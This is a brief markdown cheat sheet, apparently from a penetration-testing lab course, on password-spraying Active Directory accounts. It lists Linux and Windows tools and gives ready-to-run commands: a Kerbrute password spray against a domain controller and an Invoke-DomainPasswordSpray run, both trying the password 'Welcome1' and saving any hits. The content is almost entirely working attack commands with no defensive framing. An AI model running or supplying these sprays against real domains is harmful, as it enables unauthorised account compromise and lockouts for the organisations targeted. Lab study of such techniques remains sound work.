## Linux
- nxc

- Kerbrute
```shell-session
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
## Windows
- Kerbrute
- DomainPasswordSpray.ps1
```powershell-session
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

